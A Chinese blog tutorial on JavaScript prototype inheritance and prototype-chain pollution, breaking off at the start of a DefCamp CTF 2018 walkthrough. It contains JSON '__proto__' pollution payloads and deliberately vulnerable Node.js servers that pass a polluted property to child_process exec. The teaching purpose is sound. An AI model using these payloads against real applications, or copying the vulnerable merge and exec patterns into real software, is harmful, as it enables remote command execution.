<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="rt95"><meta name="description" content="record_of_mylife"><link rel="alternative" href="/atom.xml" title="你好我是王日天@" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><title>JS 原型链污染 - 你好我是王日天@</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">你好我是王日天@</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">目录</a></li><li class="head-nav__item"><a class="head-nav__link" href="/links">links</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"><time class="post__time" datetime="2019-09-08T16:00:00.000Z">2019 - 09 - 09</time><h1 class="post__title"><a href="/2019/09/09/深入理解 javascript 原型链污染/">JS 原型链污染</a></h1><div class="post__main echo"><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1@ 前言"></a>1@ 前言</h1><p>最近开始着手编程能力的提高，主要学习和复习一些前端的知识。之前看到过 p 神博客中写到的 js 的原型链污染问题，于是自己进行了一定程度的学习和尝试，写下我的总结，供各位同学们参阅。</p>
<h1 id="2-JS-的原型继承机制"><a href="#2-JS-的原型继承机制" class="headerlink" title="2@ JS 的原型继承机制"></a>2@ JS 的原型继承机制</h1><p>基础知识我在此就不做过多介绍了，还有所疑惑的同学可以<a href="https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more" target="_blank" rel="noopener">戳这</a>,亦或是<a href="https://juejin.im/entry/58dfbe0361ff4b006b166388" target="_blank" rel="noopener">戳这</a>。</p>
<p>这里只简单说下我对 js 继承方法的理解。平常我们学到的大部分面向对象的语言都有类机制，也大多都有 class 这个关键字。而 js 大多还是使用最原生的原型链继承的方法，尽管 class 关键字已经被引入。</p>
<blockquote>
<p>新的关键字<code>class</code>从ES6开始正式被引入到JavaScript中。<code>class</code>的目的就是让定义类更简单。</p>
</blockquote>
<p>实际上，class 继承机制仍旧是原型继承实现的。</p>
<p>我们现在拿一个其他具有类机制的语言看下，这里使用 python 做例子。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name,age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.money = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">person = Person(<span class="string">'rt95'</span>,<span class="number">20</span>)</span><br><span class="line">print(person.money) // <span class="number">1000</span></span><br><span class="line">print(person.name) // rt95</span><br></pre></td></tr></table></figure>

<p>这里的继承机制很明显，person 这个对象的生成类就是 Person() 类，类中的一切方法和属性都被对象继承，亦可以被 extends 的子类继承。</p>
<p>反观一下 Js 中的继承例子</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.money = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person(<span class="string">"rt95"</span>, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">console</span>.log(person.money);</span><br><span class="line"><span class="built_in">console</span>.log(person.name);</span><br></pre></td></tr></table></figure>

<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/1.png" alt="1.png"></p>
<p>我们一般理解的是对象直接由类构造而来，而且构造函数是在类里面的一个方法。但是 Js 却恰恰相反，它的构造函数在外面，而真正的类被包含在构造函数里面，属于构造函数的一个属性 <strong>prototype</strong>,所以刚开始的时候用 Js 的对象和原型的时候会感觉到特别的蹩脚。</p>
<p>我们可以这样来理解，以上面的例子为主，我们现在有一个对象 person ，它的类就是构造函数中的 Person.prototype, 而这个类的构造函数就是 Person()，其中：</p>
<p><code>Person.prototype 和 person.__proto__</code>指向的都是普通意义上 person 对象的类。用之前的面向对象思维理解 Js 的继承机制，可能会是个好办法，如果不喜欢这种办法，就按你舒服的方法来理解。</p>
<h2 id="2-1-constructor"><a href="#2-1-constructor" class="headerlink" title="2.1 constructor"></a>2.1 constructor</h2><p>这里再提一个小点，我们在其他前端开发的代码中经常会看见类似下面的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Student.prototype.constructor = Student;</span><br></pre></td></tr></table></figure>

<p>类似场景大部分出现在构造函数中的原型直接使用了其他构造函数的原型生成对象，如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">Person.prototype.copy = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.constructor();</span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">name</span>) </span>&#123;  </span><br><span class="line">    Person.call(<span class="keyword">this</span>, name);</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Student.prototype = <span class="built_in">Object</span>.create(Person.prototype);</span><br></pre></td></tr></table></figure>

<p>上述代码在 Student 构造函数里面直接调用了 Person 构造函数的方法，而且构造函数的原型也直接改为了用 Person 构造函数原型创建的一个对象，即当下所有以 Student 这个构造函数构造的对象会继承所有 Person() 构造函数里面的属性和方法，可是，坏就坏在所有上面了，我们来继续看看下面的这个对象生成：</p>
<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/2.png" alt="2.png"></p>
<p>本来变量 rt95 就是 Student 这个构造函数创建的，只不过它内部使用了 Person 构造函数的方法和继承了一些属性，所以于情于理我们需要将这一点更改过来，使新创建对象们都能认识到自己真正的祖宗是谁！！！</p>
<p>我们再来手动的更改一下这个构造函数的对象的属性，使用下面的例子做演示：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foreign</span>(<span class="params">shame</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.shame = shame;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">Foreign.prototype.copy = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.constructor();</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">China</span>(<span class="params">name, shame</span>) </span>&#123;</span><br><span class="line">      Foreign.call(<span class="keyword">this</span>, shame);</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">China.prototype = <span class="built_in">Object</span>.create(Foreign.prototype);</span><br><span class="line">China.prototype.constructor = China;</span><br></pre></td></tr></table></figure>

<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/3.png" alt="3.png"></p>
<p>所以不光是人需要，代码也需要认清自己真正的祖先，否则会造成很多的麻烦。</p>
<h1 id="3-Js-中的原型链污染"><a href="#3-Js-中的原型链污染" class="headerlink" title="3@ Js 中的原型链污染"></a>3@ Js 中的原型链污染</h1><p>这里我们就拿 p 神博客中的例子来一起探讨一下原型链污染的问题</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数描述的就是合并两个对象。</p>
<p>我们先使用原文给出的第一种 payload :</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br></pre></td></tr></table></figure>

<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/4.png" alt="4.png"></p>
<p>可以看到，这种方式合并对象，js 引擎是把  _<em>proto_</em> 当做了真正的对象的原型指向的属性，所以里面的值会被附在 o1 对象的属性上面，不会污染原型链。</p>
<p>我们再看第二个 payload :</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/5.png" alt="5.png"></p>
<p>这里我们看到 b 的值已经成功被写入到了原型链中了，下面我们看看这两种不同处理的数据到底区别在哪。</p>
<h2 id="3-1-真假-proto"><a href="#3-1-真假-proto" class="headerlink" title="3.1 真假 _proto_"></a>3.1 真假 _<em>proto_</em></h2><p>我们都知道，js 中每个对象都有自己的 _<em>proto_</em>,也就是它的原型，包括它的原型也具有这个属性。而这条继承链的终点就是 Object.prototype , 这也很容易验证：</p>
<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/6.png" alt="6.png"></p>
<p>那么如果我们能控制继承链终点的这个对象的属性，那么所有之后代码中生成的对象都会继承，也就此形成了原型链污染。那么我们有什么办法可以来向这个终点对象写入属性呢？</p>
<p>我们首先尝试一下直接覆盖最终对象的 __proto__：</p>
<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/7.png" alt="7.png"></p>
<p>我们看到，虽然已经写进来了，但是并不是写到了终点对象的属性里面，也就是说，生成对象的原型的原型才是我们真正要操作的那个对象。那么现在我们想一下，这种办法生成的 __proto__ 属性永远都不可能是最终的那个对象的  __proto__,为什么呢？因为用这种方法构造出来的原型，其实还是调用了一次 Object 这个构造函数，那么最少也只能是二次继承终点对象。我们用这种方法覆盖 __proto__的方法是不成立的。</p>
<p>那么有什么办法，我们构造的这个 __proto__会被认定为最终对象的 __proto__ 呢？目前没有直接修改的办法，因为我们不可能通过一次修改来改变系统保留的 __proto__ 属性，排除 那种直接可以操控的办法：</p>
<p><code>xxx.__proto__.xxx = xxx</code></p>
<p>但是我们可以构造一个普通的非系统保留的 __proto__ 属性，然后通过合并的方式来达到我们的目的。什么方法？上文已经提到了，就是 JSON.parse() 这个方法，因为解析这个 json 格式的字符串是从整体来看的，那么里面的 __proto__ 属性可以被解析为一个对象的普通属性。</p>
<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/8.png" alt="8.png"></p>
<p>通过对象颜色也可以看出来， 此时的这个 test对象，已经拥有了一个非系统保留的 __proto__ 属性，我们可以用下面的方法来检验：</p>
<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/9.png" alt="9.png"></p>
<p>那么我们可以通过键名合并的方式来将这个<code>假的</code> __proto__ 合并到 <code>真的</code> __proto__ 上面。调用上面的 merge() 方法实现。</p>
<h2 id="3-2-其他的几种攻击场景"><a href="#3-2-其他的几种攻击场景" class="headerlink" title="3.2 其他的几种攻击场景"></a>3.2 其他的几种攻击场景</h2><h3 id="1、-控制了多个参数"><a href="#1、-控制了多个参数" class="headerlink" title="1、 控制了多个参数"></a>1、 控制了多个参数</h3><p>想象一下这个场景，用户可以控制对象的 3 个以上的参数，那么我们将直接有机会来改变终点原型的属性：</p>
<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/10.png" alt="10.png"></p>
<p>或者是两个参数：</p>
<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/11.png" alt="11.png"></p>
<p>这是一种通过已实例化的对象来进行回溯原型污染，还可以是下面这种直接操作构造函数的形式：</p>
<p><img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/12.png" alt="12"></p>
<p>当我们可操控的对象不是最终 Object 构造函数形成的时候，我们可以使用 testObj.__proto__.__proto__ 这种方法来回溯。</p>
<p>下面给出一个测试例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> exec = <span class="built_in">require</span>(<span class="string">'child_process'</span>).exec;</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> req_url = req.url;</span><br><span class="line">        <span class="keyword">var</span> str_url = url.parse(req_url,<span class="literal">true</span>).query;</span><br><span class="line">        <span class="keyword">var</span> path1 = <span class="built_in">String</span>(str_url.pathname1);</span><br><span class="line">        <span class="keyword">var</span> path2 = <span class="built_in">String</span>(str_url.pathname2);</span><br><span class="line">        <span class="keyword">var</span> value = <span class="built_in">String</span>(str_url.value);</span><br><span class="line">        <span class="keyword">var</span> obj = &#123;<span class="attr">earth</span>:&#123;<span class="attr">country</span>:<span class="string">'UK'</span>&#125;&#125;;</span><br><span class="line">        obj[path1][path2] = value;</span><br><span class="line">        <span class="built_in">console</span>.log(obj)</span><br><span class="line">        <span class="keyword">var</span> test = &#123;&#125;;</span><br><span class="line">        exec(test.vul,<span class="function"><span class="keyword">function</span>(<span class="params">err,data,stderr</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(stderr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(data);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)&#125;).listen(<span class="number">1234</span>);</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">'http://127.0.0.1:1234'</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">pathname1:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pathname1"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">pathname2:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pathname2"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">value   :<span class="tag">&lt;<span class="name">input</span> <span class="attr">type:</span>"<span class="attr">text</span>" <span class="attr">name</span>=<span class="string">"value"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span> <span class="attr">name</span>=<span class="string">'submit'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们访问客户端来构造利用 payload :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pathname1 = __proto__</span><br><span class="line">pathname2 = a</span><br><span class="line">value = command</span><br></pre></td></tr></table></figure>

<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/13.png" alt="13"></p>
<h3 id="2、控制了路径赋值参数"><a href="#2、控制了路径赋值参数" class="headerlink" title="2、控制了路径赋值参数"></a>2、控制了路径赋值参数</h3><p>有的 api 里面有通过传入路径来给对象属性赋值的方法，如果部分参数可控，便可以达到原型链污染的目的，沿用上面的代码例子，我们引入 pathval 这个第三方 api，通过里面的 setPathVal 方法，来触发原型链污染的漏洞：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> exec = <span class="built_in">require</span>(<span class="string">'child_process'</span>).exec;</span><br><span class="line"><span class="keyword">var</span> pathval = <span class="built_in">require</span>(<span class="string">'pathval'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> req_url = req.url;</span><br><span class="line">        <span class="keyword">var</span> str_url = url.parse(req_url,<span class="literal">true</span>).query;</span><br><span class="line">        <span class="keyword">var</span> path1 = <span class="built_in">String</span>(str_url.pathname1);</span><br><span class="line">        <span class="keyword">var</span> value = <span class="built_in">String</span>(str_url.value);</span><br><span class="line">        <span class="keyword">var</span> obj = &#123;<span class="attr">earth</span>:&#123;<span class="attr">country</span>:<span class="string">'UK'</span>&#125;&#125;;</span><br><span class="line">        pathval.setPathValue(obj,path1,value)</span><br><span class="line">        <span class="keyword">var</span> test = &#123;&#125;;</span><br><span class="line">        exec(test.vul,<span class="function"><span class="keyword">function</span>(<span class="params">err,data,stderr</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(stderr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(data);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)&#125;).listen(<span class="number">1234</span>);</span><br></pre></td></tr></table></figure>

<p> <img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/14.png" alt="14"></p>
<h3 id="3、对象克隆"><a href="#3、对象克隆" class="headerlink" title="3、对象克隆"></a>3、对象克隆</h3><p>实质上还是递归进行合并的做法，我们可以用前面分析过的方法理解。下面我们提下一般深层克隆的方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        name: <span class="string">"rt95"</span>,</span><br><span class="line">        age: <span class="number">20</span>,</span><br><span class="line">        monry: <span class="number">1000</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> obj1 = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">origin, target</span>) </span>&#123;</span><br><span class="line">        target = target || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">        toStr = <span class="built_in">Object</span>.prototype.toString;</span><br><span class="line">        arrstr = <span class="string">"[object Array]"</span>;</span><br><span class="line">        <span class="keyword">for</span> (prop <span class="keyword">in</span> origin) &#123;</span><br><span class="line">            <span class="keyword">if</span> (origin.hasOwnProperty(prop)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">typeof</span>(origin[prop]) === <span class="string">"object"</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (toStr.call(prop) === arrstr) &#123;</span><br><span class="line">                        target[prop] = [];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        target[prop] = &#123;&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    clone(origin[prop], target[prop])</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    target[prop] = origin[prop];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clone(obj, obj1);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>大致流程就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、生成克隆对象 ------&gt;</span><br><span class="line">2、判断 origin（被克隆对象）的元素是原始值还是引用值 ------&gt;</span><br><span class="line">3、原始值直接进行赋值，引用值需要分情况 ------&gt;</span><br><span class="line">4、引用值如果是数组，那么在克隆对象中创建一个空数组，然后递归上面原始值的克隆过程 -----&gt;</span><br><span class="line">5、引用值如果是对象，那么在克隆对象中创建一个空对象，然后递归上面原始值的克隆过程。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原始值：</p>
<p>存储在栈（stack）中的简单数据段，也就是说，它们的值直接存储在变量访问的位置。</p>
<p>引用值：</p>
<p>存储在堆（heap）中的对象，也就是说，存储在变量处的值是一个指针（point），指向存储对象的内存处。</p>
</blockquote>
<ul>
<li>原始值就是单变量形成的值，值一般是字面量，像整数，字符串等。</li>
<li>引用值就是对象，数组等结构型的值。</li>
</ul>
<p>那么克隆引用值的时候赋给克隆对象的值将会是原对象所指的数据处，那么相当于克隆对象和被克隆对象共有这组值。所以为了实现完全独一份的克隆，我们需要深入到引用值内部元素，然后进行克隆对象新建相应引用值类型数据结构后的逐一赋值。</p>
<h1 id="4-实战题目"><a href="#4-实战题目" class="headerlink" title="4@ 实战题目"></a>4@ 实战题目</h1><p>题目来源于 DefCamp CTF 2018 ，源码可以<a href="https://dctf.def.camp/dctf-18-quals-81249812/chat.zip" target="_blank" rel="noopener">在这下载</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// 客户端代码</span><br><span class="line">const io = require(&apos;socket.io-client&apos;)</span><br><span class="line">const socket = io.connect(&apos;https://chat.dctfq18.def.camp&apos;) // 此处我们可以设为本地测试的地址</span><br><span class="line"></span><br><span class="line">if(process.argv.length != 4) &#123;</span><br><span class="line">  console.log(&apos;name and channel missing&apos;)</span><br><span class="line">   process.exit()</span><br><span class="line">&#125;</span><br><span class="line">console.log(&apos;Logging as &apos; + process.argv[2] + &apos; on &apos; + process.argv[3])</span><br><span class="line">var inputUser = &#123;</span><br><span class="line">  name: process.argv[2],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">socket.on(&apos;message&apos;, function(msg) &#123;</span><br><span class="line">  console.log(msg.from,&quot;[&quot;, msg.channel!==undefined?msg.channel:&apos;Default&apos;,&quot;]&quot;, &quot;says:\n&quot;, msg.message);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">socket.on(&apos;error&apos;, function (err) &#123;</span><br><span class="line">  console.log(&apos;received socket error:&apos;)</span><br><span class="line">  console.log(err)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">socket.emit(&apos;register&apos;, JSON.stringify(inputUser));</span><br><span class="line">socket.emit(&apos;message&apos;, JSON.stringify(&#123; msg: &quot;hello&quot; &#125;));</span><br><span class="line">socket.emit(&apos;join&apos;, process.argv[3]);//ps: you should keep your channels private</span><br><span class="line">socket.emit(&apos;message&apos;, JSON.stringify(&#123; channel: process.argv[3], msg: &quot;hello channel&quot; &#125;));</span><br><span class="line">socket.emit(&apos;message&apos;, JSON.stringify(&#123; channel: &quot;test&quot;, msg: &quot;i own you&quot; &#125;));</span><br></pre></td></tr></table></figure>

<p>从命令行接受进入参数后，然后将序列化后的数据发送到服务端，触发服务端事件。</p>
<p>在源码包里面我们发现了服务端引用模块文件 helper.js 中有如下执行系统命令的方法：</p>
